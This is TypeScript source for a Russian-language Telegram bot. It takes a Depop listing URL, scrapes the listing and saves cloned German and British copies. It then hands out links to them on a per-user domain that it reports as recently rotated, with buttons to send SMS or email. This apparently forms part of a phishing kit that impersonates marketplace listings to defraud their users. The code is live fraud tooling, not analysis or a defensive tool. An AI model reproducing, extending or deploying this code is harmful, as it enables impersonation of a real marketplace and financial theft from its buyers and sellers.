import {Context} from "@/database/models/context";
import {Composer, InlineKeyboard, Keyboard} from "grammy";
import {Ads} from "@/database/models/ads";
import {adsRepository, domensRepository, profilesRepository, userRepository} from "@/database";
import moment from 'moment';
import {User} from "@/database/models/user";
import {getPictureMenu} from "@/helpers/getPictureMenu";
import {Scene} from "grammy-scenes";
import {deleteAllMessages} from "@/helpers/deleteAllMessages";
import {parseStringVinted} from "@/handlers/parseUrl/vinted/parseStringVinted";
import {getFlagEmoji} from "@/helpers/getFlagEmoji";
import {getService} from "@/helpers/getServices";
import {Profiles} from "@/database/models/profiles";
import {parseStringDepop} from "@/handlers/parseUrl/depop/parseStringDepop";
import {getDomen} from "@/helpers/getDomen";

export const composer = new Composer<Context>()
const regex = /depop\.(?<platform>com)\/(?<link>.+)\//gm
composer.hears(regex, handler)
moment.locale('ru')

async function preCreateAd(ctx, parse, match, profileId) {
    const {ads, ads2, newAd} = await createAd(parse, ctx, match)

    const domen = await getDomen(ctx.user, 'depop')
    if (!domen) return ctx.reply('domen undefined error')

    return ctx.replyWithPhoto(await getPictureMenu(ctx.user), {
        caption:`
${(newAd) ? '🪄 Ссылка создана!' : '🪄 Ссылка была создана ранее!'}

🐨 ID объявления: <code>${ads.date}</code>

🌳 <b>Название:</b> <code>${ads.title}</code>
🌳 <b>Цена:</b> <code>${ads.price}</code>
🌳 <b>Платформа: DEPOP [ 🇩🇪 🇦🇺 🇬🇧 ]</b>${(ads.profile) ? `\n<b>🌳 Профиль:</b> <code>${ads.profile.fullName}</code>` : ''}
♻️ <b>Домен сменён ${moment(new Date(domen.dateChange)).fromNow()}</b>
➖➖➖➖➖➖➖
🇩🇪 <b>Созданная ссылка:</b> <a href="https://${domen.link}/service/${ads.service}/${ads.link}">LINK [2.0]</a>
🇦🇺 🇬🇧 <b>Созданная ссылка:</b> <a href="https://${domen.link}/service/${ads2.service}/${ads2.link}">LINK [2.0]</a>
`.replace('\n', ''),
        reply_markup: await createKeyboard(ads.id, ctx.user)
    })
}

const createKeyboard = async (id: Number, user: User) => {
    const keyb = new InlineKeyboard()
        // .text("🙊 Настройки", `settings ad ${id}`)

    keyb.row()

    if (user.sms > 0) {
        keyb.text("📲 SMS", `sms ad ${id}`)
    }

    if (user.email > 0) {
        keyb.text("💌 EMAIL", `email ad depop ${id}`)
    }

    keyb.row()
    keyb.text("⚙ Настройки", `settings ad ${id}`)
    keyb.row()
    keyb.text("Главное меню", `menuWithPicture`)

    return keyb

}
async function handler (ctx: Context) {
    const parse = await parseStringDepop(ctx.msg.text, ctx)
    if (parse === undefined) return null
    const match = regex.exec(ctx.msg.text)
    match.groups.platform = 'de'
    match[1] = 'de'

    return ctx.scenes.enter('setDeliveryAmountDepop', {
        parse, match
    })
}

async function cancel (ctx) {
    try {
        await deleteAllMessages (ctx.session.deleteMessage,ctx)
    } catch (e) {}
    ctx.scene.exit()
}

export const scene = new Scene<Context>('setDeliveryAmountDepop')


scene.always().callbackQuery('skip setDeliveryAmountDepop', async  (ctx) => {
    // @ts-ignore
    await preCreateAd(ctx, ctx.session.anyObject.parse, ctx.session.anyObject.match)
    return cancel(ctx)
})

scene.do(async (ctx) => {
    ctx.session.deleteMessage = []
    ctx.session.anyObject = ctx.scene.arg

    const res = await ctx.reply('🌱 <b>Введи цену доставки:</b>\n<code>Пример: 23.99</code>', {
        reply_markup: {
            inline_keyboard: [
                [{text: 'Пропустить', callback_data: 'skip setDeliveryAmountDepop'}]
            ]
        }
    })
    ctx.session.deleteMessage.push(res.message_id)
    return ctx.scene.resume()
})

scene.wait().hears(/(^\d+\.\d\d)|(^\d+)/, async ctx => {
    try {
        ctx.session.deleteMessage.push(ctx.msg.message_id)
    } catch (e) {}
    const userPrice = parseFloat(ctx.match[0])
    // @ts-ignore
    const price = parseFloat(ctx.session.anyObject.parse.detail.price)

    // @ts-ignore
    ctx.session.anyObject.parse.detail.price = (userPrice + parseFloat(price)).toFixed(2) + ' €'

    // @ts-ignore
    await preCreateAd(ctx, ctx.session.anyObject.parse, ctx.session.anyObject.match)
    return cancel(ctx)
})

function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const createAd = async (parse,ctx, match) => {
    const oldAd = await adsRepository.findOne({
        relations: {author: true},
        where: {
            originallink: match[2],
            author: {
                tgId: ctx.user.tgId
            }
        }
    })

    if (oldAd && oldAd.delete !== false) return {
        ads: oldAd,
        newAd: false
    }

    const unix = String(Date.now())
    const randomInt1 = getRandomInt(0,5)
    const randomInt2 = getRandomInt(666, 4657645344567)
    const date = `${unix.slice(13 - randomInt1,13)}` + randomInt2
    const ads = new Ads()

    ads.title = parse.detail.title
    ads.description = parse.detail.description
    ads.price = parse.detail.price
    ads.img = JSON.stringify(parse.detail.pictures)
    ads.seller = JSON.stringify(parse.detail.seller)
    ads.link = `${match[2]}${date}`
    ads.originallink = `${match[2]}`
    ads.date = `${date}`
    ads.country = 'de'
    ads.service = 'depop'
    ads.author = ctx.user
    ads.page = '0'
    ads.pageMobile = parse.pageMobile
    ads.created = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')

    await adsRepository.save(ads)

    const ads2 = new Ads()

    ads2.title = parse.detail.title
    ads2.description = parse.detail.description
    ads2.price = parse.detail.price.replace(/€/, '£')
    ads2.img = JSON.stringify(parse.detail.pictures)
    ads2.seller = JSON.stringify(parse.detail.seller)
    ads2.link = `${match[2]}${date + 1}`
    ads2.originallink = `${match[2]}`
    ads2.date = `${date + 1}`
    ads2.country = 'gb'
    ads2.service = 'depop'
    ads2.author = ctx.user
    ads2.page = '0'
    ads2.pageMobile = parse.pageMobile
    ads2.created = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')

    await adsRepository.save(ads2)
    return {
        ads,
        ads2,
        newAd: true
    }
}